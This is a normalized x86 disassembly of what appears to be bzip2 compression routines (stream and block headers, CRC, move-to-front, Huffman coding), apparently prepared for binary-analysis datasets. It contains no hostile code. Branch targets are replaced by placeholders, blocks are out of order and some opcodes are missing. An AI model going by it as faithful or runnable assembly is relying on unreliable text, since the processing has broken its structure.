mov edx [ eax + 0x34 ]
mov bl 0x1
mov [ eax + edx + 0x58 ] bl
mov edx [ eax + 0x38 ]
mov esi edx
dec esi
je r-xdata
mov esi [ esp + 0x10 ]
and esi 0xff
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
pop edi
mov [ edx + esi ] cl
mov ecx [ eax + 0x44 ]
inc ecx
pop esi
mov [ eax + 0x44 ] ecx
pop ebx
retn
dec esi
je r-xdata
mov edx [ eax + 0x260 ]
mov ebx edx
shr ebx 0x18
xor ebx esi
shl edx 0x8
mov ebx [ ebx * 4 + rw-data ]
xor ebx edx
dec edi
mov [ eax + 0x260 ] ebx
jne r-xdata
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
mov [ edx + esi ] cl
dec esi
je r-xdata
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
mov [ edx + esi ] cl
mov esi [ eax + 0x44 ]
inc esi
mov [ eax + 0x44 ] esi
mov edx esi
mov esi [ eax + 0x24 ]
mov [ esi + edx ] cl
jmp r-xdata
mov [ edx + eax + 0x54 ] bl
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
mov [ edx + esi ] cl
mov esi [ eax + 0x44 ]
inc esi
mov [ eax + 0x44 ] esi
mov edx esi
mov esi [ eax + 0x24 ]
mov [ esi + edx ] cl
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
inc edx
mov [ eax + 0x44 ] edx
mov [ esi + edx ] cl
mov ebx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
inc ebx
mov edx ebx
mov [ eax + 0x44 ] ebx
mov [ esi + edx ] cl
mov edi [ eax + 0x44 ]
mov dl [ eax + 0x38 ]
mov esi [ eax + 0x24 ]
inc edi
sub dl 0x4
mov ecx edi
mov [ eax + 0x44 ] edi
pop edi
mov [ esi + ecx ] dl
mov ecx [ eax + 0x44 ]
inc ecx
pop esi
mov [ eax + 0x44 ] ecx
pop ebx
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
inc edx
pop edi
mov [ eax + 0x44 ] edx
mov [ esi + edx ] cl
mov ecx [ eax + 0x44 ]
inc ecx
pop esi
mov [ eax + 0x44 ] ecx
pop ebx
retn
sub_410fe0
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov [ esp + 0x13 ] 0x0
mov eax [ esi + 0x4 ]
mov ebx 0x1
cmp eax 0x2
jne r-xdata
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x48 ]
cmp edx eax
jge r-xdata
mov eax [ esi + 0x44 ]
mov ecx [ esi + 0x48 ]
cmp eax ecx
jge r-xdata
mov al [ esp + 0x13 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ eax ]
xor edx edx
mov [ esp + 0x13 ] bl
mov dl [ ecx ]
mov ecx [ esi + 0x34 ]
mov edi edx
cmp edi ecx
je r-xdata
mov eax [ eax ]
xor ecx ecx
mov [ esp + 0x13 ] bl
mov cl [ eax ]
mov edi ecx
mov ecx [ esi + 0x34 ]
cmp edi ecx
je r-xdata
mov eax [ esi + 0x38 ]
cmp eax 0xff
je r-xdata
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov eax [ esi + 0x38 ]
cmp eax 0xff
je r-xdata
cmp [ esi + 0x38 ] ebx
jne r-xdata
cmp ecx 0x100
jae r-xdata
inc eax
mov [ esi + 0x38 ] eax
jmp r-xdata
cmp edi ecx
jne r-xdata
mov eax [ esi + 0x260 ]
mov dl cl
mov [ esp + 0x18 ] dl
mov ebx eax
mov ebp [ esp + 0x18 ]
shr ebx 0x18
and ebp 0xff
xor ebx ebp
shl eax 0x8
mov ebx [ ebx * 4 + rw-data ]
xor ebx eax
mov [ esi + 0x260 ] ebx
mov ebx 0x1
mov [ ecx + esi + 0x58 ] bl
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ esi + 0x44 ]
inc eax
mov [ esi + 0x34 ] edi
mov [ esi + 0x44 ] eax
jmp r-xdata
cmp ecx 0x100
jae r-xdata
inc eax
mov [ esi + 0x38 ] eax
jmp r-xdata
cmp edi ecx
jne r-xdata
mov eax [ esi + 0x260 ]
mov dl cl
mov [ esp + 0x18 ] dl
mov ebx eax
mov ebp [ esp + 0x18 ]
shr ebx 0x18
and ebp 0xff
xor ebx ebp
shl eax 0x8
mov ebx [ ebx * 4 + rw-data ]
xor ebx eax
mov [ esi + 0x260 ] ebx
mov ebx 0x1
mov [ ecx + esi + 0x58 ] bl
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ esi + 0x44 ]
inc eax
mov [ esi + 0x34 ] edi
mov [ esi + 0x44 ] eax
jmp r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] ebx
push esi
call sub_410ed0
add esp 0x4
mov eax [ esi ]
mov ebp [ eax ]
inc ebp
mov [ eax ] ebp
mov eax [ esi ]
mov edi [ eax + 0x4 ]
dec edi
mov [ eax + 0x4 ] edi
mov eax [ esi ]
mov edx [ eax + 0x8 ]
inc edx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] ebx
push esi
call sub_410ed0
add esp 0x4
mov eax [ esi ]
mov ebp [ eax ]
inc ebp
mov [ eax ] ebp
mov eax [ esi ]
mov edi [ eax + 0x4 ]
dec edi
mov [ eax + 0x4 ] edi
mov eax [ esi ]
mov edx [ eax + 0x8 ]
inc edx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
inc [ eax + 0xc ]
jmp r-xdata
dec [ esi + 0xc ]
jmp r-xdata
inc [ eax + 0xc ]
sub_4111d0
mov ecx [ esp + 0x4 ]
push ebx
push esi
push edi
xor al al
pop edi
pop esi
pop ebx
retn
mov esi [ ecx + 0x50 ]
mov edi [ ecx + 0x4c ]
cmp esi edi
jge r-xdata
mov edi [ ecx + 0x2c ]
mov edx [ edx + 0x10 ]
mov al 0x1
mov bl [ edi + esi ]
mov [ edx ] bl
mov edi [ ecx + 0x50 ]
mov edx [ ecx ]
inc edi
mov [ ecx + 0x50 ] edi
mov esi [ edx + 0x14 ]
dec esi
mov [ edx + 0x14 ] esi
mov edx [ ecx ]
mov ebx [ edx + 0x10 ]
inc ebx
mov [ edx + 0x10 ] ebx
mov edx [ ecx ]
mov edi [ edx + 0x18 ]
inc edi
mov [ edx + 0x18 ] edi
mov edx [ ecx ]
mov esi [ edx + 0x18 ]
test esi esi
jne r-xdata
mov edx [ ecx ]
mov esi [ edx + 0x14 ]
test esi esi
je r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
sub_411230
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov edi [ esi + 0x20 ]
test edi edi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x4
cmp [ edi ] esi
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x4
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn 0x4
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x2c ]
push eax
call [ esi + 0x28 ]
add esp 0x8
mov edi [ edi + 0x18 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x2c ]
push eax
push ecx
call [ esi + 0x28 ]
add esp 0x8
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x2c ]
push eax
push ecx
call [ esi + 0x28 ]
add esp 0x8
mov [ esi + 0x20 ] 0x0
xor eax eax
pop edi
pop esi
retn 0x4
mov edx [ esi + 0x2c ]
push edi
push edx
call [ esi + 0x28 ]
add esp 0x8
sub_4112e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x44 ]
test eax eax
jle r-xdata
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x44 ]
mov eax [ esi + 0x26c ]
add edx ecx
cmp eax 0x1
mov [ esi + 0x2c ] edx
jne r-xdata
mov ecx [ esi + 0x264 ]
mov eax [ esi + 0x260 ]
mov edx ecx
add ecx ecx
shr edx 0x1f
not eax
or edx ecx
mov [ esi + 0x260 ] eax
xor edx eax
mov eax [ esi + 0x26c ]
cmp eax 0x1
mov [ esi + 0x264 ] edx
jle r-xdata
mov eax [ esi + 0x44 ]
test eax eax
jle r-xdata
push esi
call sub_4112c0
push 0x42
push esi
call sub_411580
push 0x5a
push esi
call sub_411580
push 0x68
push esi
call sub_411580
mov al [ esi + 0x270 ]
add al 0x30
push eax
push esi
call sub_411580
add esp 0x24
push esi
call sub_4133d0
add esp 0x4
mov [ esi + 0x4c ] 0x0
mov al [ esp + 0xc ]
test al al
je r-xdata
push 0x31
push esi
call sub_411580
push 0x41
push esi
call sub_411580
push 0x59
push esi
call sub_411580
push 0x26
push esi
call sub_411580
push 0x53
push esi
call sub_411580
push 0x59
push esi
call sub_411580
mov ecx [ esi + 0x260 ]
push ecx
push esi
call sub_411530
push 0x0
push 0x1
push esi
call sub_4114a0
mov edx [ esi + 0x1c ]
add esp 0x44
push edx
push 0x18
push esi
call sub_4114a0
push esi
call sub_4115a0
push esi
call sub_4117b0
add esp 0x14
pop esi
retn
push 0x17
push esi
call sub_411580
push 0x72
push esi
call sub_411580
push 0x45
push esi
call sub_411580
push 0x38
push esi
call sub_411580
push 0x50
push esi
call sub_411580
push 0x90
push esi
call sub_411580
mov eax [ esi + 0x264 ]
push eax
push esi
call sub_411530
push esi
call sub_411440
add esp 0x3c
sub_411440
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x25c ]
test ecx ecx
jle r-xdata
retn
push esi
push edi
mov ecx 0xfffffff8
mov edx [ eax + 0x258 ]
mov esi [ eax + 0x2c ]
mov edi [ eax + 0x4c ]
shr edx 0x18
mov [ esi + edi ] dl
mov edx [ eax + 0x4c ]
mov esi [ eax + 0x25c ]
mov edi [ eax + 0x258 ]
inc edx
add esi ecx
mov [ eax + 0x4c ] edx
mov edx esi
shl edi 0x8
test edx edx
mov [ eax + 0x258 ] edi
mov [ eax + 0x25c ] esi
jg r-xdata
pop edi
pop esi
sub_4114a0
mov eax [ esp + 0x4 ]
push esi
push edi
cmp [ eax + 0x25c ] 0x8
jl r-xdata
mov edx [ eax + 0x25c ]
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov ecx 0x20
sub ecx edx
add edx esi
sub ecx esi
mov [ eax + 0x25c ] edx
shl edi cl
mov ecx [ eax + 0x258 ]
or ecx edi
pop edi
mov [ eax + 0x258 ] ecx
pop esi
retn
mov ecx 0xfffffff8
mov edx [ eax + 0x258 ]
mov esi [ eax + 0x2c ]
mov edi [ eax + 0x4c ]
shr edx 0x18
mov [ esi + edi ] dl
mov edx [ eax + 0x4c ]
mov esi [ eax + 0x25c ]
mov edi [ eax + 0x258 ]
inc edx
add esi ecx
mov [ eax + 0x4c ] edx
mov edx esi
shl edi 0x8
cmp edx 0x8
mov [ eax + 0x258 ] edi
mov [ eax + 0x25c ] esi
jge r-xdata
sub_411530
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
push esi
mov esi [ esp + 0xc ]
shr eax 0x18
push eax
push 0x8
push esi
call sub_4114a0
xor ecx ecx
mov cl [ esp + 0x1e ]
push ecx
push 0x8
push esi
call sub_4114a0
xor edx edx
mov dl bh
push edx
push 0x8
push esi
call sub_4114a0
and ebx 0xff
push ebx
push 0x8
push esi
call sub_4114a0
add esp 0x30
pop esi
pop ebx
retn
sub_4115a0
sub esp 0x114
push ebx
push ebp
push esi
mov esi [ esp + 0x124 ]
push edi
push esi
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
mov ebx [ esi + 0x20 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] ecx
call sub_411780
mov eax [ esi + 0x54 ]
add esp 0x4
inc eax
mov [ esp + 0x1c ] eax
js r-xdata
mov ecx [ esi + 0x54 ]
xor edi edi
xor edx edx
xor eax eax
test ecx ecx
mov [ esp + 0x10 ] edx
jle r-xdata
lea ecx [ eax + 0x1 ]
lea edi [ esi + 0x278 ]
xor eax eax
[ edi ]
mov eax [ esi + 0x44 ]
xor ebp ebp
test eax eax
jle r-xdata
mov [ esp + eax + 0x24 ] al
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
mov [ ecx + edi * 2 ] ax
mov ecx [ esi + eax * 4 + 0x278 ]
inc ecx
inc edi
mov [ esi + eax * 4 + 0x278 ] ecx
mov [ esi + 0x274 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x114
retn
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x20 ]
xor eax eax
mov al [ ecx + ebx ]
mov bl [ eax + esi + 0x158 ]
mov al [ esp + 0x24 ]
cmp al bl
jne r-xdata
add ecx eax
test edx edx
jle r-xdata
inc edx
mov [ esp + 0x10 ] edx
jmp r-xdata
mov cl [ esp + 0x25 ]
mov al [ esp + 0x24 ]
mov [ esp + 0x25 ] al
cmp bl cl
lea eax [ esp + 0x25 ]
je r-xdata
mov ecx [ esp + 0x14 ]
dec edx
lea ecx [ ecx + edi * 2 ]
mov ebx [ esp + 0x18 ]
mov eax [ esi + 0x44 ]
inc ebp
add ebx 0x4
cmp ebp eax
mov [ esp + 0x18 ] ebx
jl r-xdata
mov ebx [ esp + 0x14 ]
mov [ esp + 0x24 ] cl
lea ecx [ esp + 0x24 ]
sub eax ecx
inc edi
lea ecx [ eax + 0x1 ]
mov [ ebx + edi * 2 - 0x2 ] cx
mov ecx [ esi + eax * 4 + 0x27c ]
inc ecx
mov [ esi + eax * 4 + 0x27c ] ecx
inc eax
mov dl cl
mov cl [ eax ]
mov [ eax ] dl
cmp bl cl
jne r-xdata
mov [ ecx ] 0x0
mov eax [ esi + 0x278 ]
inc edi
add ecx 0x2
inc eax
mov [ esi + 0x278 ] eax
mov [ ecx ] 0x1
mov eax [ esi + 0x27c ]
inc edi
add ecx 0x2
inc eax
mov [ esi + 0x27c ] eax
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov ecx [ ecx ]
dec ecx
jns r-xdata
test edx edx
jle r-xdata
mov edx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x0
mov edx [ esp + 0x10 ]
lea eax [ edx - 0x2 ]
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x10 ] eax
mov edx eax
jmp r-xdata
cmp edx 0x2
jl r-xdata
mov eax [ esp + 0x14 ]
dec edx
lea ecx [ eax + edi * 2 ]
test dl 0x1
je r-xdata
mov [ ecx ] 0x0
mov eax [ esi + 0x278 ]
inc edi
add ecx 0x2
inc eax
mov [ esi + 0x278 ] eax
mov [ ecx ] 0x1
mov eax [ esi + 0x27c ]
inc edi
add ecx 0x2
inc eax
mov [ esi + 0x27c ] eax
jmp r-xdata
lea eax [ edx - 0x2 ]
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x10 ] eax
mov edx eax
jmp r-xdata
cmp edx 0x2
jl r-xdata
test dl 0x1
je r-xdata
sub_411780
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x54 ] 0x0
inc ecx
cmp ecx 0x100
jl r-xdata
mov dl [ eax + 0x54 ]
mov [ ecx + eax + 0x158 ] dl
mov edx [ eax + 0x54 ]
inc edx
mov [ eax + 0x54 ] edx
mov dl [ eax + ecx + 0x58 ]
test dl dl
je r-xdata
retn
sub_4117b0
sub esp 0x4c
push ebx
push ebp
push esi
mov esi [ esp + 0x5c ]
push edi
mov [ esp + 0x60 ] 0x6
mov ebp [ esi + 0x54 ]
mov ebx [ esi + 0x28 ]
add ebp 0x2
lea edx [ esi + 0x9324 ]
mov [ esp + 0x14 ] ebp
mov eax [ esp + 0x60 ]
add edx 0x102
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
mov ecx ebp
mov eax 0xf0f0f0f
mov edi edx
shr ecx 0x2
[ edi ]
mov ecx ebp
mov ebp [ esp + 0x14 ]
and ecx 0x3
[ edi ]
test ebp ebp
jle r-xdata
mov eax [ esi + 0x274 ]
test eax eax
jg r-xdata
mov eax [ esi + 0x274 ]
cmp eax 0xc8
jge r-xdata
push 0xbb9
call sub_402720
add esp 0x4
cmp eax 0x258
jge r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
cmp eax 0x4b0
jge r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
mov ecx [ esp + 0x10 ]
xor edx edx
mov edi ecx
cmp ecx edx
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x60 ] edx
jle r-xdata
xor ecx ecx
cmp eax 0x960
setge cl
add ecx 0x5
mov [ esp + 0x10 ] ecx
mov [ esp + 0x10 ] 0x4
jmp r-xdata
mov [ esp + 0x30 ] 0x4
add ecx 0x91
mov [ esp + 0x18 ] edx
mov edx ecx
shl edx 0x7
add edx ecx
lea ecx [ esi + edx * 2 ]
mov [ esp + 0x1c ] ecx
mov ebp [ esp + 0x14 ]
mov ecx ebp
xor eax eax
lea edi [ esp + 0x44 ]
mov [ esp + 0x60 ] ebp
mov ebp [ esp + 0x14 ]
lea edx [ esi + 0xb160 ]
[ edi ]
cmp ecx [ esp + 0x60 ]
jle r-xdata
dec ebp
lea edi [ esi + ecx * 4 + 0x278 ]
xor ebp ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x28 ] ebp
test ebp ebp
jle r-xdata
mov eax [ esp + 0x60 ]
add edx 0x408
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
mov ecx ebp
xor eax eax
mov edi edx
[ edi ]
xor eax eax
test ebp ebp
jle r-xdata
cmp edi [ esp + 0x10 ]
je r-xdata
mov ebp [ esp + 0x14 ]
mov edi [ esp + 0x20 ]
add edx [ edi + 0x4 ]
add edi 0x4
inc ecx
cmp edx eax
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea eax [ ebp + 0x31 ]
cmp eax ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x18 ] eax
jl r-xdata
mov ebp 0xffff6cdc
lea eax [ esi + 0x9324 ]
lea edi [ esi + 0xc994 ]
sub ebp esi
test ebp ebp
jle r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
dec edi
inc eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1c ]
sub eax 0x102
inc ecx
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x24 ]
sub eax edx
mov [ esp + 0x60 ] ecx
test edi edi
mov [ esp + 0x24 ] eax
jg r-xdata
cmp eax [ esp + 0x60 ]
jl r-xdata
cmp edi 0x1
je r-xdata
cmp ecx ebp
jge r-xdata
test edx edx
jle r-xdata
test edx edx
jle r-xdata
test edx edx
jle r-xdata
lea eax [ ecx - 0x1 ]
mov [ esp + 0x18 ] eax
xor ecx ecx
xor edx edx
mov cl [ eax + 0x102 ]
mov dl [ eax ]
shl ecx 0x10
or ecx edx
xor edx edx
mov [ edi - 0x4 ] ecx
mov dl [ eax + 0x204 ]
xor ecx ecx
add edi 0x10
mov cl [ eax + 0x306 ]
shl ecx 0x10
or ecx edx
xor edx edx
mov [ edi - 0x10 ] ecx
mov dl [ eax + 0x408 ]
xor ecx ecx
mov cl [ eax + 0x50a ]
shl ecx 0x10
or ecx edx
mov edx [ esp + 0x14 ]
inc eax
mov [ edi - 0xc ] ecx
lea ecx [ eax + ebp ]
cmp ecx edx
jl r-xdata
cmp [ esp + 0x10 ] 0x6
jne r-xdata
cdq
idiv edi
mov edx [ esp + 0x60 ]
lea ecx [ edx - 0x1 ]
xor edx edx
test eax eax
jle r-xdata
mov ebp [ esp + 0x1c ]
mov [ eax + ebp ] 0xf
cmp eax ecx
jg r-xdata
mov eax [ esp + 0x18 ]
and eax 0x80000001
jns r-xdata
mov eax [ esp + 0x30 ]
dec eax
mov [ esp + 0x30 ] eax
jne r-xdata
lea ebp [ esi + 0x9324 ]
lea edi [ esi + 0xb160 ]
mov [ esp + 0x60 ] edx
jmp r-xdata
cmp edx 0x6
jne r-xdata
mov ecx edx
xor eax eax
lea edi [ esp + 0x34 ]
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov [ eax + ebp ] 0x0
jmp r-xdata
cmp eax 0x1
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov ebp [ esp + 0x10 ]
test ebp ebp
jle r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx 0x8
jl r-xdata
mov eax [ esp + 0x14 ]
push 0x11
push eax
push edi
push ebp
call sub_414d30
mov eax [ esp + 0x70 ]
add esp 0x10
add edi 0x408
add ebp 0x102
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
cmp ebp eax
jg r-xdata
mov ecx eax
sub ecx ebp
inc ecx
cmp ecx 0x32
jne r-xdata
mov ebp [ esp + 0x14 ]
inc eax
cmp eax ebp
jl r-xdata
mov eax [ esi + ecx * 4 + 0x278 ]
sub edx eax
dec ecx
mov ebp [ esp + 0x1c ]
cmp ebp 0x8000
jge r-xdata
push 0xbba
call sub_402720
mov ecx [ esp + 0x14 ]
add esp 0x4
or eax 0xffffffff
xor edi edi
test edx edx
mov [ esp + 0x24 ] 0x3b9ac9ff
jle r-xdata
lea eax [ ebx + ebp * 2 ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x18 ]
sub eax ebp
inc eax
mov [ esp + 0x24 ] eax
jmp r-xdata
mov cx [ ebx + ebp * 2 ]
mov di [ ebx + ebp * 2 + 0x2 ]
and ecx 0xffff
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
lea edx [ ecx + 0xc99 ]
shl edx 0x4
shl edi 0x4
mov eax [ edx + esi ]
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl ecx 0x4
shl edi 0x4
lea edx [ ecx + esi ]
add edi esi
mov ecx [ edx + 0xc994 ]
mov edx [ edx + 0xc998 ]
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x4 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x6 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x8 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0xa ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0xc ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0xe ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x10 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x12 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x14 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x16 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x18 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x1a ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x1c ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x1e ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x20 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x22 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x24 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x26 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x28 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x2a ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x2c ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x2e ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x30 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x32 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x34 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
